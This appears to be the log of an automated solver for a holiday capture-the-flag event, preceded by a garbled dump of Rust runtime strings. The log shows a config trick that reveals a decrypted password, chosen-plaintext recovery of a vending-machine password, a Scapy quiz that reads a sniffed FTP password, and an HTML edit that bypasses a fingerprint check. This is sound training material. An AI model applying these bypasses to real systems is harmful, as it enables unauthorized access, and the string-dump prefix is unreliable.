                index  out of range for slice of length slice index starts at  but ends at src/libcore/result.rsattempted to index slice up to maximum usizesrc/libcore/fmt/mod.rssrc/libcore/option.rsErrorsrc/libcore/str/pattern.rs {
                 {  }(
                src/libcore/unicode/bool_trie.rsindex out of bounds: the len is g
                [assertion failed: PAGE_SIZE != 0failed to initiate panic, error  but the index is BorrowErrorBorrowMutError
                assertion failed: broken.is_empty()src/libcore/str/lossy.rs_ZNZN_$SPBPRFLTGTLPRP@_RR__R?[]::{closure:#}::<>, usizeu64u32u16u80x_'...!f64f32isizei64i32i16i8()str&*const ; (,> Cunsafe -" fn( +  = punycode{/usr/src/rustc-1.41.1/vendor/rustc-demangle/src/v0.rs.llvm./root/.cargo/registry/src/github.com-1ecc6299db9ec823/block-buffer-0.9.0/src/lib.rsassertion failed: end <= lensrc/libstd/sys/unix/stack_overflow.rsfailed to allocate an alternative stackstack overflowfailed to get environment variable `src/libstd/env.rsstream did not contain valid UTF-8fatal runtime error: 
                thread '' has overflowed its stack
                environment variable was not valid unicode: environment variable not foundOnce instance has previously been poisonedassertion failed: state_and_queue & STATE_MASK == RUNNINGsrc/libstd/sync/once.rs..src/libstd/path.rsuse of std::thread::current() is not possible after the thread's local data has been destroyedsrc/libstd/thread/mod.rsinconsistent state in unparkinconsistent park statepark state changed unexpectedlythread name may not contain interior null bytesfailed to generate unique thread ID: bitspace exhausteddata provided contains a nul bytefailed to write the buffered dataother os erroroperation interruptedwrite zerotimed outinvalid datainvalid input parameteroperation would blockentity already existsbroken pipeaddress not availableaddress in usenot connectedconnection abortedconnection refusedpermission deniedunexpected end of file (os error )assertion failed: queue != DONEsrc/libstd/sys_common/at_exit_imp.rssrc/libstd/sys/unix/mod.rsassertion failed: signal(libc::SIGPIPE, libc::SIG_IGN) != libc::SIG_ERRcannot access stdin during shutdowncannot access stdout during shutdowncannot access stderr during shutdownstdoutsrc/libstd/io/stdio.rsfailed printing to stderrPoisonError { inner: .. }`: internal error: entered unreachable code<::core::macros::panic macros>Tried to shrink to a larger capacityalready mutably borrowedAccessErrorcannot access a Thread Local Storage value during or after destructionsrc/libstd/sync/condvar.rsattempted to use a condition variable with two mutexessrc/libstd/sys_common/thread_info.rsassertion failed: c.borrow().is_none()assertion failed: key != 0src/libstd/sys/unix/thread_local.rssrc/libstd/sys/unix/condvar.rs"
                \x__rust_begin_short_backtrace/usr/src/rustc-1.41.1/src/libcore/str/pattern.rsformatter errorfailed to write whole bufferRUST_BACKTRACE0note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
                <unknown>.memory allocation of  bytes failed
                attempt to calculate the remainder with a divisor of zerosrc/libstd/sys/unix/thread.rscalled `Result::unwrap()` on an `Err` valuesrc/libstd/sys/unix/os.rsstrerror_r failure`/proc/self/exeno /proc/self/exe available. Is /proc mounted?rwlock maximum reader count exceededrwlock read lock would result in deadlockthread panicked while panicking. aborting.
                <unnamed>note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.
                ' panicked at '', 
                thread panicked while processing panic. aborting.
                src/libstd/sys/unix/rwlock.rsassertion failed: `(left == right)`
                  left: ``,
                 right: `urn:uuid:called `Option::unwrap()` on a `None` value
                0123456789abcdefABCDEF-/root/.cargo/registry/src/github.com-1ecc6299db9ec823/uuid-0.8.1/src/parser/mod.rs/usr/src/rustc-1.41.1/src/libcore/macros/mod.rsinvalid group lengthinvalid number of groupsinvalid characterinvalid length an optional prefix of `urn:uuid:` followed byexpected  in group one of  : invalid bytes length: expected /proc/curproc/file
                /proc/self/exe
                /proc/%ld/object/a.out
                failed to read executable information
                libbacktrace could not find executable to open
                close
                backtrace library does not support threads
                no debug info in ELF executable
                no symbol table in ELF executable
                .debug_info
                executable file is not ELF
                ELF section name out of range
                .note.gnu.build-id
                .gnu_debuglink
                .opd
                /usr/lib/debug/.build-id/
                .debug/
                /usr/lib/debug/
                fstat
                executable file is unrecognized ELF version
                executable file is unexpected ELF class
                executable file has unknown endianness
                ELF symbol table strtab link out of range
                symbol string index out of range
                 n;^
                Qkkbal
                .data
                .bss
                .comment
            
2020-12-27 11:32:15.218 +00:00 [VRB] Challenge SpeakerDoorOpen completed
2020-12-27 11:32:15.250 +00:00 [VRB] Running challange SpeakerLightsOn
2020-12-27 11:32:15.254 +00:00 [INF] ---t is ---t?, hin--- is hin---

                The speaker unpreparedness room sure is dark, you're thinking (assuming
                you've opened the door; otherwise, you wonder how dark it actually is)

                You wonder how to turn the lights on? If only you had some kind of hin---

                    >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf

                ---t to help figure out the password... I guess you'll just have to make do!

                The terminal just blinks: Welcome back, elf-technician

                What do you enter? > light
                Checking......
                Beep boop invalid password
            
2020-12-27 11:32:15.295 +00:00 [INF] cat /home/elf/lights.conf

                password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
                name: elf-technician
            
2020-12-27 11:32:15.309 +00:00 [INF] Removed one character from the password.

                Failed to parse key `password`: OddLength
                Password is missing from config file!
            
2020-12-27 11:32:15.311 +00:00 [INF] Remove entire password
Couldn't read config file: Badly formatted line (expected: "key: value"): 
2020-12-27 11:32:15.312 +00:00 [INF] Rename elf-technician to E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 in ./lab/lights.conf to get Computer-TurnLightsOn

                elf@0e91ec090c86 ~/lab $ vi lights.conf 
                elf@0e91ec090c86 ~/lab $ ./lights       
                The speaker unpreparedness room sure is dark, you're thinking (assuming
                you've opened the door; otherwise, you wonder how dark it actually is)

                You wonder how to turn the lights on? If only you had some kind of hin---

                 >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf

                ---t to help figure out the password... I guess you'll just have to make do!

                The terminal just blinks: Welcome back, Computer-TurnLightsOn

                What do you enter? > ^C
                elf@0e91ec090c86 ~/lab $ cat ./lights.conf 
                password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
                name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
                elf@0e91ec090c86 ~/lab $ 
            
2020-12-27 11:32:15.344 +00:00 [VRB] Challenge SpeakerLightsOn completed
2020-12-27 11:32:15.361 +00:00 [VRB] Running challange SpeakerVendingMachineOn
2020-12-27 11:32:15.410 +00:00 [INF] Goto lab directory, delete vending-machines.json

                cd lab/
                rm vending-machines.json
                ./vending-machines                
                
            
2020-12-27 11:32:15.412 +00:00 [INF] We can run ./vending-machines, provide new password and then see how it looks like in the json file.
                
                The elves are hungry!

                If the door's still closed or the lights are still off, you know because
                you can hear them complaining about the turned-off vending machines!
                You can probably make some friends if you can get them back on...

                Loading configuration from: /home/elf/lab/vending-machines.json

                I wonder what would happen if it couldn't find its config file? Maybe that's
                something you could figure out in the lab...

                ALERT! ALERT! Configuration file is missing! New Configuration File Creator Activated!

                Please enter the name >     
                Please enter the password > AAAAAAAAAAAAAAAAAAAAAAAA

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > AAAAAAAAAAAAAAAAAAAAAAAA
                Checking......
                That would have enabled the vending machines!

                If you have the real password, be sure to run /home/elf/vending-machines
                elf@aa086c750649 ~/lab $ cat ./vending-machines.json 
                {
                  "name": "",
                  "password": "XiGRehmwXiGRehmwXiGRehmw"
                }
                elf @aa086c750649 ~/lab $             
            
2020-12-27 11:32:15.417 +00:00 [INF] Trying single letter... and viola first letter matches... 

                Please enter the password > C

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > 
                Checking......
                Beep boop invalid password
                elf@aa086c750649 ~/lab $ cat vending-machines.json 
                {
                    "name": "",
                    "password": "L"
                }
            
2020-12-27 11:32:15.420 +00:00 [INF] This is password we are looking for. cat vending-machines.json
                
                {
                  "name": "elf - maintenance",
                  "password": "LVEdQPpBwr"                                
               }                                                
            
2020-12-27 11:32:15.423 +00:00 [INF] Trying Candies

                Please enter the name > 
                Please enter the password > Candies    

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > 
                Checking......
                Beep boop invalid password
                elf@aa086c750649 ~/lab $ cat vending-machines.json 
                {
                  "name": "",
                  "password": "LVEd4Yb"
                }                       
            
2020-12-27 11:32:15.475 +00:00 [INF] Trying Candyman


                Please enter the name > 
                Please enter the password > Candyman

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > 
                Checking......
                Beep boop invalid password
                elf@aa086c750649 ~/lab $ cat vending-machines.json 
                {
                  "name": "",
                  "password": "LVEdQRpB"
                }

            
2020-12-27 11:32:15.478 +00:00 [INF] rm vending-machines.json;./vending-machines;cat vending-machines.json

                The elves are hungry!

                If the door's still closed or the lights are still off, you know because
                you can hear them complaining about the turned-off vending machines!
                You can probably make some friends if you can get them back on...

                Loading configuration from: /home/elf/lab/vending-machines.json

                I wonder what would happen if it couldn't find its config file? Maybe that's
                something you could figure out in the lab...

                ALERT! ALERT! Configuration file is missing! New Configuration File Creator Activated!

                Please enter the name > 
                Please enter the password > Candymane1

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > 
                Checking......
                Beep boop invalid password
                {
                  "name": "",
                  "password": "LVEdQRpBwr"
                }

            
2020-12-27 11:32:15.484 +00:00 [INF] Password was found.

                LVEdQPpBwr  -- CandyCane1
                LVEdQLpBwr  -- Candy1ane1
                LVEdQbpBwr     CandyLane1
            
2020-12-27 11:32:15.485 +00:00 [INF] ./vending-machines

                The elves are hungry!

                If the door's still closed or the lights are still off, you know because
                you can hear them complaining about the turned-off vending machines!
                You can probably make some friends if you can get them back on...

                Loading configuration from: /home/elf/vending-machines.json

                I wonder what would happen if it couldn't find its config file? Maybe that's
                something you could figure out in the lab...

                Welcome, elf-maintenance! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > CandyCane1
                Checking......

                Vending machines enabled!!
            
2020-12-27 11:32:15.541 +00:00 [VRB] Challenge SpeakerVendingMachineOn completed
2020-12-27 11:32:15.543 +00:00 [VRB] Running challange CANBusInvestigation
2020-12-27 11:32:15.545 +00:00 [INF] CAN bus challenge

                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX00OkxxddcddxxkOO0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMMMMMMMMWXOxoc:c.;cccccc.ccccc:.:c:ldxOXMMMMMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMMMMMXkoc',ccccc:.:ccccc.ccccc.;cccc,'::cdOXMMMMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMMMM0xc:cccc,':cccc::ccccccccccccccc:.;cccccc:lxXMMMMMMMMMMMMMMMM
                MMMMMMMMMMMMMMNkl,',:ccccc;;ccccccccccccccccccccc::cccccc:,',:lOWMMMMMMMMMMMMM
                MMMMMMMMMMMMNxccccc;';cccccccccccccccccccccccccccccccccc;':cccccckWMMMMMMMMMMM
                MMMMMMMMMMNdcccccc:..;cccccccccccccccccccccccccccccccccccccccccccc:kWMMMMMMMMM
                MMMMMMMMM0c,,,,:cccc;..;cccccccccccccccccccccccccccccccccccccc:,,,;:lKMMMMMMMM
                MMMMMMMWd:cccc;:cccccc;..,cccccccccccccccccccccccccccccccccccc;:cccccckMMMMMMM
                MMMMMMNlcccccccccccccccc:..,:ccccccccccccccccccccccccccccccccccccccccc:oWMMMMM
                MMMMMNc,,,,,:ccccccccccccc:..':cccccccccccccccccccccccccccccccccc:,,,,,;oWMMMM
                MMMMWoccccc::ccccccccccccccc:'.':cccccccccccccccccccccccccccccccc::ccccccxMMMM
                MMMMkccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccccc:0MMM
                MMMN::cccccccccccccccccccccccccc:'..:cccccccccccccccccccccccccccccccccccc:cWMM
                MMMk,,,,,:cccccccccccccccccccccccc:,..;ccccccccccccccccccccccccccccc:,,,,,;0MM
                MMMlccccccccccccccccccccccccccccccccc,.;cccccccccccccccccccccccccccccccccccdMM
                MMW:ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccclMM
                MMWOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0MM
                MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

                Welcome to the CAN bus terminal challenge!

                In your home folder, there's a CAN bus capture from Santa's sleigh. Some of
                the data has been cleaned up, so don't worry - it isn't too noisy. What you
                will see is a record of the engine idling up and down. Also in the data are
                a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK?
                We'd like to encode another key mechanism.

                Find the decimal portion of the timestamp of the UNLOCK code in candump.log
                and submit it to ./runtoanswer!  (e.g., if the timestamp is 123456.112233,
                please submit 112233)
            
2020-12-27 11:32:15.591 +00:00 [VRB] Challenge CANBusInvestigation completed
2020-12-27 11:32:15.592 +00:00 [VRB] Running challange ScapyPrepper
2020-12-27 11:32:15.594 +00:00 [INF] yes

                Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing pr
                esent packets for shipment.
                Start by running the task.submit() function passing in a string argument of 'start'.
                Type task.help() for help on this question.

            
2020-12-27 11:32:15.596 +00:00 [INF] task.submit('start')

                Welcome to the "Present Packet Prepper" interface! The North Pole could use your help preparing pr
                esent packets for shipment.
                Start by running the task.submit() function passing in a string argument of 'start'.
                Type task.help() for help on this question.

                Correct! adding a () to a function or class will execute it. Ex - FunctionExecuted()

            
2020-12-27 11:32:15.599 +00:00 [INF] task.submit(send)

                Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.
                
                Correct! The "send" scapy class will send a crafted scapy packet out of a network interface.

            
2020-12-27 11:32:15.627 +00:00 [INF] task.submit(sniff)

                Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.
                
                Correct! the "sniff" scapy class will sniff network traffic and return these packets in a list.

            
2020-12-27 11:32:15.639 +00:00 [INF] task.submit(1)

                Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named "pkt":
                1.pkt = sr1(IP(dst = "127.0.0.1") / TCP(dport = 20))
                2.pkt = sniff(IP(dst = "127.0.0.1") / TCP(dport = 20))
                3.pkt = sendp(IP(dst = "127.0.0.1") / TCP(dport = 20))

                Correct! sr1 will send a packet, then immediately sniff for a response packet.

            
2020-12-27 11:32:15.641 +00:00 [INF] task.submit(rdpcap)

                Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.

                Correct! the "rdpcap" scapy class can read pcap files.

            
2020-12-27 11:32:15.642 +00:00 [INF] task.submit(2)

                The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices 
                below that correctly prints a summary of UDP_PACKETS:

                1. UDP_PACKETS.print()
                2. UDP_PACKETS.show()
                3. UDP_PACKETS.list()

                Correct! .show() can be used on lists of packets AND on an individual packet.

            
2020-12-27 11:32:15.644 +00:00 [INF] task.submit(UDP_PACKETS[0])

                Submit only the first packet found in UDP_PACKETS.

                >>> UDP_PACKETS.show()
                0000 Ether / IP / UDP / DNS Qry "b'www.elves.rule.'"
                0001 Ether / IP / UDP / DNS Ans "10.21.23.12"

                Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0.

            
2020-12-27 11:32:15.647 +00:00 [INF] task.submit(TCP_PACKETS[1][TCP])

                Submit only the entire TCP layer of the second packet in TCP_PACKETS

                Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc... can be accessed this way. Ex - pkt[IP][TCP]

            
2020-12-27 11:32:15.680 +00:00 [INF] 
                UDP_PACKETS[0][IP].src="127.0.0.1"
                task.submit(UDP_PACKETS[0])
            

                Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet                

                Correct! You can change ALL scapy packet attributes using this method.

            
2020-12-27 11:32:15.681 +00:00 [INF] task.submit('echo')

                Submit the password "task.submit('elf_password')" of the user alabaster as found in the packet list TCP_PACKETS.
                
                >>> TCP_PACKETS.hexdump()

                0000 17:24:40.499548 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp S
                0000  00 15 F2 40 76 EF 00 16 CE 6E 8B 24 08 00 45 00  ...@v....n.$..E.
                0010  00 30 A7 E3 40 00 80 06 D0 60 C0 A8 00 72 C0 A8  .0..@....`...r..
                0020  00 C1 04 71 00 15 DF B3 B2 FE 00 00 00 00 70 02  ...q..........p.
                0030  40 00 29 63 00 00 02 04 05 B4 01 01 04 02        @.)c..........
                0001 17:24:40.501867 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 SA
                0000  00 16 CE 6E 8B 24 00 15 F2 40 76 EF 08 00 45 00  ...n.$...@v...E.
                0010  00 30 29 60 00 00 80 06 8E E4 C0 A8 00 C1 C0 A8  .0)`............
                0020  00 72 00 15 04 71 C6 C7 01 41 DF B3 B2 FF 70 12  .r...q...A....p.
                0030  40 00 61 51 00 00 02 04 05 AC 01 01 04 02        @.aQ..........
                0002 17:24:40.501886 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp A
                0000  00 15 F2 40 76 EF 00 16 CE 6E 8B 24 08 00 45 00  ...@v....n.$..E.
                0010  00 28 A7 E4 40 00 80 06 D0 67 C0 A8 00 72 C0 A8  .(..@....g...r..
                0020  00 C1 04 71 00 15 DF B3 B2 FF C6 C7 01 42 50 10  ...q.........BP.
                0030  44 10 89 FD 00 00                                D.....
                0003 17:24:40.503947 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
                0000  00 16 CE 6E 8B 24 00 15 F2 40 76 EF 08 00 45 00  ...n.$...@v...E.
                0010  00 46 29 61 40 00 80 06 4E CD C0 A8 00 C1 C0 A8  .F)a@...N.......
                0020  00 72 00 15 04 71 C6 C7 01 42 DF B3 B2 FF 50 18  .r...q...B....P.
                0030  FF FF D9 7D 00 00 32 32 30 20 4E 6F 72 74 68 20  ...}..220 North 
                0040  50 6F 6C 65 20 46 54 50 20 53 65 72 76 65 72 0D  Pole FTP Server.
                0050  0A                                               .
                0004 17:24:40.504807 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw
                0000  00 15 F2 40 76 EF 00 16 CE 6E 8B 24 08 00 45 00  ...@v....n.$..E.
                0010  00 37 A7 E5 40 00 80 06 D0 57 C0 A8 00 72 C0 A8  .7..@....W...r..
                0020  00 C1 04 71 00 15 DF B3 B2 FF C6 C7 01 60 50 18  ...q.........`P.
                0030  43 F2 0A 98 00 00 55 53 45 52 20 61 6C 61 62 61  C.....USER alaba
                0040  73 74 65 72 0D                                   ster.
                0005 17:24:40.506108 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
                0000  00 16 CE 6E 8B 24 00 15 F2 40 76 EF 08 00 45 00  ...n.$...@v...E.
                0010  00 4D 29 62 40 00 80 06 4E C5 C0 A8 00 C1 C0 A8  .M)b@...N.......
                0020  00 72 00 15 04 71 C6 C7 01 60 DF B3 B3 0E 50 18  .r...q...`....P.
                0030  FF F0 3D 9C 00 00 33 33 31 20 50 61 73 73 77 6F  ..=...331 Passwo
                0040  72 64 20 72 65 71 75 69 72 65 64 20 66 6F 72 20  rd required for 
                0050  61 6C 61 62 61 73 74 65 72 2E 0D                 alabaster..
                0006 17:24:40.507195 Ether / IP / TCP 192.168.0.114:1137 > 192.168.0.193:ftp PA / Raw
                0000  00 15 F2 40 76 EF 00 16 CE 6E 8B 24 08 00 45 00  ...@v....n.$..E.
                0010  00 33 A7 E6 40 00 80 06 D0 5A C0 A8 00 72 C0 A8  .3..@....Z...r..
                0020  00 C1 04 71 00 15 DF B3 B3 0E C6 C7 01 85 50 18  ...q..........P.
                0030  43 CD E9 6B 00 00 50 41 53 53 20 65 63 68 6F 0D  C..k..PASS echo.
                0040  0A                                               .
                0007 17:24:40.509484 Ether / IP / TCP 192.168.0.193:ftp > 192.168.0.114:1137 PA / Raw
                0000  00 16 CE 6E 8B 24 00 15 F2 40 76 EF 08 00 45 00  ...n.$...@v...E.
                0010  00 46 29 63 40 00 80 06 4E CB C0 A8 00 C1 C0 A8  .F)c@...N.......
                0020  00 72 00 15 04 71 C6 C7 01 85 DF B3 B3 19 50 18  .r...q........P.
                0030  FF E5 00 D3 00 00 32 33 30 20 55 73 65 72 20 61  ......230 User a
                0040  6C 61 62 61 73 74 65 72 20 6C 6F 67 67 65 64 20  labaster logged 
                0050  69 6E 2E 0D                                      in..

                >>> TCP_PACKETS[6][Raw]
                <Raw  load='PASS echo\r\n' |>


                Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets:
                [pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]


            
2020-12-27 11:32:15.921 +00:00 [INF] task.submit(ICMP_PACKETS[1][ICMP].chksum)

                The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. 
                Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.

                >>> ICMP_PACKETS
                <No name: TCP:0 UDP:0 ICMP:4 Other:0>

                >>> ICMP_PACKETS.show()
                0000 Ether / IP / ICMP 10.2.2.123 > 10.21.23.12 echo-request 0 / Raw
                0001 Ether / IP / ICMP 10.21.23.12 > 10.21.23.12 echo-reply 0 / Raw
                0002 Ether / IP / ICMP 10.2.2.123 > 10.21.23.12 echo-request 0 / Raw
                0003 Ether / IP / ICMP 10.21.23.12 > 10.21.23.12 echo-reply 0 / Raw

                >>> ICMP_PACKETS[1]
                <Ether  dst=00:0c:29:d0:96:b3 src=00:50:56:f9:54:66 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=84 id=2585 flags= frag=0 ttl=128 proto=icmp chksum=0xe69b src=10.21.23.12 dst=10.21.23.12 |<ICMP  type=echo-reply code=0 chksum=0x4c44 id=0x6d38 seq=0x1 unused='' |<Raw  load='L=\xa7^\x00\x00\x00\x00\x88\x13\x0c\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567' |>>>>

                Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum .

            
2020-12-27 11:32:15.972 +00:00 [INF] task.submit(3)

                Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named "pkt"

                1.pkt = Ether(src = '127.0.0.1') / ICMP(type = "echo-request")
                2.pkt = IP(src = '127.0.0.1') / ICMP(type = "echo-reply")
                3.pkt = IP(dst = '127.0.0.1') / ICMP(type = "echo-request")

                Correct! Once you assign the packet to a variable named "pkt" you can then use that variable to send or manipulate your created packet.

            
2020-12-27 11:32:16.038 +00:00 [INF] task.submit(IP(dst="127.127.127.127")/UDP(dport=5000))

                Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)

                >>> pkt = IP(dst="127.127.127.127")/UDP(dport=5000)
                >>> task.submit(pkt)

                Correct! Your UDP packet creation should look something like this:
                pkt = IP(dst="127.127.127.127")/UDP(dport=5000)
                task.submit(pkt)

            
2020-12-27 11:32:16.040 +00:00 [INF] task.submit(IP(dst="127.2.3.4")/UDP(dport=53)/DNS(qd=DNSQR(qname="elveslove.santa")))

                Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query 
                with a qname of "elveslove.santa". (all other packet attributes can be unspecified)

                Correct! Your UDP packet creation should look something like this:
                pkt = IP(dst="127.2.3.4")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="elveslove.santa"))
                task.submit(pkt)

            
2020-12-27 11:32:16.042 +00:00 [INF] 
                ARP_PACKETS[1][ARP].op='is-at'                
                ARP_PACKETS[1][ARP].hwsrc='00:13:46:0b:22:ba'
                ARP_PACKETS[1][ARP].hwdst='00:16:ce:6e:8b:24'task.submit(ARP_PACKETS)
            

                The variable ARP_PACKETS contains an ARP request and response packets. 
                The ARP response (the second packet) has 3 incorrect fields in the ARP layer. 
                Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.

                >>> task.submit(ARP_PACKETS)
                Incorrect!
                The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. 
                Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.

                The three fields in ARP_PACKETS[1][ARP] that are incorrect are op, hwsrc, and hwdst. 
                A sample ARP pcap can be referenced at https://www.cloudshark.org/captures/e4d6ea732135. 
                You can run the "reset_arp()" function to reset the ARP packets back to their original form.

                >>> ARP_PACKETS[1][ARP]
                <ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r' |>>

                >>> reset_arp()

                >>> ARP_PACKETS[1][ARP]
                <ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r' |>>

                >>> ARP_PACKETS.hexdump()
                0000 19:59:22.880651 Ether / ARP who has 192.168.0.1 says 192.168.0.114
                0000  FF FF FF FF FF FF 00 16 CE 6E 8B 24 08 06 00 01  .........n.$....
                0010  08 00 06 04 00 01 00 16 CE 6E 8B 24 C0 A8 00 72  .........n.$...r
                0020  00 00 00 00 00 00 C0 A8 00 01                    ..........
                0001 19:59:22.884732 Ether / ARP None 192.168.0.1 > 192.168.0.114 / Padding
                0000  00 16 CE 6E 8B 24 00 13 46 0B 22 BA 08 06 00 01  ...n.$..F.......
                0010  08 00 06 04 00 00 FF FF FF FF FF FF C0 A8 00 01  ................
                0020  FF FF FF FF FF FF C0 A8 00 72 C0 A8 00 72        .........r...r


                >>> ARP_PACKETS[0][ARP]
                <ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=who-has hwsrc=00:16:ce:6e:8b:24 psrc=192.168.0.114 hwdst=00:00:00:00:00:00 pdst=192.168.0.1 |>

                >>> ARP_PACKETS[1][ARP]
                <ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r' |>>

              
                >>> ARP_PACKETS[1]
                <Ether  dst=00:16:ce:6e:8b:24 src=00:13:46:0b:22:ba type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=01:16:ce:6e:8b:24 psrc=192.168.0.1 hwdst=00:16:ce:6e:8b:24 pdst=192.168.0.114 |<Padding  load='\xc0\xa8\x00r' |>>>

                >>> ARP_PACKETS[1][ARP].op='is-at'
                >>> ARP_PACKETS[1][ARP].hwsrc='00:13:46:0b:22:ba'
                >>> ARP_PACKETS[1][ARP].hwdst='00:16:ce:6e:8b:24'


                Great, you prepared all the present packets!

                Congratulations, all pretty present packets properly prepared for processing!

            
2020-12-27 11:32:16.211 +00:00 [VRB] Challenge ScapyPrepper completed
2020-12-27 11:32:16.213 +00:00 [VRB] Running challange DefeatFingerprintSensor
2020-12-27 11:32:16.214 +00:00 [INF] Change data-floor value to get to 3rd floor if the button is not powered yet.

                <body class="marble portals nut2 nut candycane ball yellowlight elevator-key greenlight redlight workshop-button">
                    <div class="box-parent">
                      <canvas id="stage" class="juice" width="563" height="600"></canvas>
                      <div class="glow red" style="background-position: 0px -216px;"></div>
                      <div class="glow yellow" style="background-position: 0px 0px;"></div>
                      <div class="glow green" style="background-position: 0px -108px;"></div>
                      <div class="led red on"></div>
                      <div class="led yellow"></div>
                      <div class="led green on"></div>
                      <div class="print-indicator"></div>
                      <div class="help-overlay"></div>
                      <button class="reset-btn">Reset Configuration</button>
                      <button class="help-btn">Help</button>
                    <div class="item planet marble" data-type="planet" data-name="marble" style="left: 547px; top: 313px;"></div><div class="item light redlight" data-type="light" data-name="redlight" style="left: 253px; top: 40.5px;"></div><div class="item light yellowlight" data-type="light" data-name="yellowlight" style="left: 158px; top: 336.5px;"></div><div class="item light greenlight" data-type="light" data-name="greenlight" style="left: 448px; top: 47.5px;"></div><div class="item item nut" data-type="item" data-name="nut" style="left: 532px; top: 336px;"></div><div class="item item nut2" data-type="item" data-name="nut2" style="left: 342px; top: 76px;"></div><div class="item item ball" data-type="item" data-name="ball" style="left: 516.5px; top: 285.5px;"></div><div class="item item candycane" data-type="item" data-name="candycane" style="left: 571px; top: 514px;"></div><div class="item portal red" data-type="portal" data-name="red" style="left: 466px; top: 152px;"></div><div class="item portal blue" data-type="portal" data-name="blue" style="left: 453px; top: 220px;"></div></div>
                    <div class="cover">
      
                      <img class="f15btn found" src="images/floor1-5button.png">
                      <div class="key"></div>
                      <div class="localstorage-error"><strong>Heads up:</strong> Your Santavator repair configuration cannot be accessed or saved in incognito mode.</div><div class="print-cover"></div>
                      <button class="btn btn1 powered" data-floor="1">1</button>
                      <button class="btn btn15 powered" data-floor="1.5">1.5</button>`
                      <button class="btn btn2 powered" data-floor="2">2</button>
                      <button class="btn btn3 active" data-floor="3">3</button>
